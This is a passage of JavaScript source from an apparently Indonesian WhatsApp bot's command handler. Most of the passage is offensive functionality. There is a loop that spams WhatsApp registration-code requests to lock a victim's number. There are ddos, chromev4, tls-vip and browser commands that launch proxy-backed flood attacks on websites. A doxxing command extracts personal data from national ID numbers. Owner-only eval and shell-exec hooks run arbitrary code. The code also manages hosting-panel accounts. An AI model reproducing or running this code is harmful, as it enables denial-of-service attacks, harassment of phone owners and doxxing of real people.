if (!qtext) return m.reply(`Example: ${prefix + command} 91|918xxxx`)
if (!/|/.test(qtext)) return m.reply(`The data you provided is invalid!, Example: \n ${prefix + command} 91|6909137211`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban/ban.json'))
let cCode = qtext.split("|")[0]
let number = qtext.split("|")[1]
let fullNo = cCode + number
await m.reply(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state } = await useMultiFileAuthState('session')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban/ban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'ddos':
if (!isCreator) return m.reply(global.nocreator)
if (!q.includes(' ')) return m.reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
let moci = `*Bot is Attacking Wait for Results* 😤
• _Target_ ->  ${targetweb} 
• _Time Attack_ -> ${timeweb} `
dimzzxoffc.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Cek Websait",
      url: `${targetweb}`,
      merchant_url: `${targetweb}`
   })
}], m, {
   body: moci,
   footer: ''
})
              exec(`node ./dist/ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          m.reply(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          kmreply(`Error: ${stderr}`);
          return;
        }
        m.reply(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
      });  
break

case 'chromev4':
{
if (!isCreator) return m.reply(global.nocreator)
if (!q.includes(' ')) return m.reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60 132 10 proxy.txt`)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
m.reply(`ATTACK WEBSITE!!\nTarget: ${url},\nTime: ${time},\nThread: ${thread},\nRate: ${rate},\nScript: ${command}`);
exec(`node ./dist/chromev4.js ${url} ${time} ${rate} ${thread} proxy.txt captcha`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break

case 'tls-vip':
{
if (!isCreator) return m.reply(global.nocreator)
if (!q.includes(' ')) return m.reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60 132 10 proxy.txt`)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
m.reply(`ATTACK WEBSITE!!\nTarget: ${url},\nTime: ${time},\nThread: ${thread},\nRate: ${rate},\nScript: ${command}`);
exec(`node ./dist/tls-vip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break

case 'browser':
{
if (!isCreator) return m.reply(global.nocreator)
if (!q.includes(' ')) return m.reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60 132 10 proxy.txt`)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
m.reply(`ATTACK WEBSITE!!\nTarget: ${url},\nTime: ${time},\nThread: ${thread},\nRate: ${rate},\nScript: ${command}`);
exec(`node ./dist/browser.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
m.reply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break

case 'doxxing': case 'dox':
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply(`</> Anda harus mendapatkan nik target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 16070xxxxx\n\n`)
const { nikParser } = require('nik-parser')
const ktp = q
const nik = nikParser(ktp)
m.reply(`Nik: ${nik.isValid()}\nProvinsi ID: ${nik.provinceId()}\nNama Provinsi: ${nik.province()}\nKabupaten ID: ${nik.kabupatenKotaId()}\nNama Kabupaten: ${nik.kabupatenKota()}\nKecamatan ID: ${nik.kecamatanId()}\nNama Kecamatan: ${nik.kecamatan()}\nKode Pos: ${nik.kodepos()}\nJenis Kelamin: ${nik.kelamin()}\nTanggal Lahir: ${nik.lahir()}\nUniqcode: ${nik.uniqcode()}`)
break

case 'getnik':
if (!isCreator) return m.reply(global.nocreator)
tutor = fs.readFileSync('./lib/video/tutor.mp4')
dimzzxoffc.sendMessage(from, {video: tutor, caption: `Bot Telegram untuk mendapatkan nik target: @IDOOSINTBOT / https://t.me/IDOOSINTBOT`},{quoted: m})
break

case "admin": {
if (!qtext) return m.reply("username")
if (!isCreator) return m.reply(global.nocreator)
let username = qtext.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat By *Yae Miko*")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel By *Yae Miko*l ✅*

* *ID :* ${user.id}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Login\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await Skyzo.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "deladmin": {
if (!args[0]) return m.reply("id\n\nuntuk melihat id admin ketik *.listadmin*")
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
m.reply(`Berhasil Menghapus Admin Panel By *Xzyyo Hoasting* *${capital(getid)}*`)
}
break
case "listadmin": {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak Ada Admin Panel")
var teks = "*🌐 LIST ADMIN PANEL*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `*┌ ◦* ID User *${i.attributes.id}*
*└ ◦* Nama *${i.attributes.first_name}*\n\n`
})
m.reply(teks)
}
break
case "cpanel": case "panel": case "buatpanel": {
if (!isCreator) return m.reply(global.nocreator)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply("nama")
global.panel = [qtext.toLowerCase()]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram Unlimited\",\"title\":\"Ram Unlimited\",\"id\":\".cpunli\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 1GB\",\"title\":\"Ram 1GB\",\"id\":\".cp1gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 2GB\",\"title\":\"Ram 2GB\",\"id\":\".cp2gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 3GB\",\"title\":\"Ram 3GB\",\"id\":\".cp3gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 4GB\",\"title\":\"Ram 4GB\",\"id\":\".cp4gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 5GB\",\"title\":\"Ram 5GB\",\"id\":\".cp5gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 6GB\",\"title\":\"Ram 6GB\",\"id\":\".cp6gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 7GB\",\"title\":\"Ram 7GB\",\"id\":\".cp7gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 8GB\",\"title\":\"Ram 8GB\",\"id\":\".cp8gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 9GB\",\"title\":\"Ram 9GB\",\"id\":\".cp9gb\"}"
}, {
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Ram 10GB\",\"title\":\"Ram 10GB\",\"id\":\".cp10gb\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await Skyzo.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cp1gb": case "cp2gb": case "cp3gb": case "cp4gb": case "cp5gb": case "cp6gb": case "cp7gb": case "cp8gb": case "cp9gb": case "cp10gb": case "cpunli": {
if (!isCreator) return m.reply(global.nocreator)
if (global.panel == null) return m.reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gb") {
ram = "1000"
disknya = "2000"
cpu = "40"
} else if (command == "cp2gb") {
ram = "2000"
disknya = "2000"
cpu = "50"
} else if (command == "cp3gb") {
ram = "3000"
disknya = "3000"
cpu = "60"
} else if (command == "cp4gb") {
ram = "4000"
disknya = "3000"
cpu = "80"
} else if (command == "cp5gb") {
ram = "5000"
disknya = "4000"
cpu = "100"
} else if (command == "cp6gb") {
ram = "6000"
disknya = "5000"
cpu = "110"
} else if (command == "cp7gb") {
ram = "7000"
disknya = "5000"
cpu = "130"
} else if (command == "cp8gb") {
ram = "8000"
disknya = "5000"
cpu = "150"
} else if (command == "cp9gb") {
ram = "9000"
disknya = "5000"
cpu = "170"
} else if (command == "cp10gb") {
ram = "10000"
disknya = "6000"
cpu = "200"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator) return m.reply(global.nocreator)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat* By *SkyzDev*")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel By *SkyzDev*✅*

* *ID :* ${server.id}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}

𝙅𝙖𝙣𝙜𝙖𝙣 𝗟𝘂𝗽𝗮 𝙅𝙤𝙞𝙣 𝙐𝙣𝙩𝙪𝙠 𝙈𝙚𝙣𝙜𝙚𝙩𝙖𝙝𝙪𝙞 𝙄𝙣𝙛𝙤 𝙎𝙚𝙡𝙖𝙣𝙟𝙪𝙩𝙣𝙮𝙖:
𝙡𝙞𝙣𝙠:  *https://chat.whatsapp.com/KQPqjAt2eQP0IaA0ALdXu2*
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Login\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await Skyzo.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel = null
}
break
case "listpanel": case "listp": case "listserver": {
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!isCreator) return m.reply(global.nocreator)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "*🌐 LIST SERVER PANEL BOT*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `*┌ ◦* ID Server *${s.id}*\n`;
messageText += `*│ ◦* Nama Server *${s.name}*\n`
messageText += `*│ ◦* Ram *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*\n`
messageText += `*│ ◦* CPU *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*\n`;
messageText += `*└ ◦* Storage *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
  await Skyzo.sendMessage(m.chat, { text: messageText }, { quoted: m })
}
break
case "delpanel": case "hapuspanel": {
if (!isCreator) return m.reply(global.nocreator)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply("idservernya\n\nuntuk melihat id server ketik *.listpanel*")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return m.reply("*ID Server/User* Tidak Ditemukan")
m.reply(`Berhasil Menghapus Akun Panel *${capital(sections[0])}*`)
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return m.reply('*Only Vip*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await replyy(evaled)
} catch (err) {
await replyy(String(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return replyy(`${err}`)
if (stdout) return replyy(stdout)
})
}

}
} catch (err) {
dimzzxoffc.sendMessage(m.chat, {text: require('util').format(err)}, {quoted: m})
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})

